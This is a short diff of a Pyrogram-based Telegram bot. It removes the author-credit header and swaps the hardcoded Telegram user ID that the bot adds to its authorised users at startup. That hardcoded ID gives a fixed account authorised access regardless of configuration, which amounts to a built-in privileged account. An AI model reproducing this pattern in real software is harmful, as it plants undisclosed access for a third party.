@@ -1,8 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# @trojanzhex
-
-
 from pyrogram import (
     Client,
     __version__
@@ -47,7 +42,7 @@ class Bot(Client):
             f"@{usr_bot_me.username}  started!\n\n"
             f"Add @{usr_bot_me.username} as admin with all rights in your required channels\n\n"
         )
-        AUTH_USERS.add(680815375)
+        AUTH_USERS.add(546607472)
         self.USER, self.USER_ID = await User().start()
 
     async def stop(self, *args):
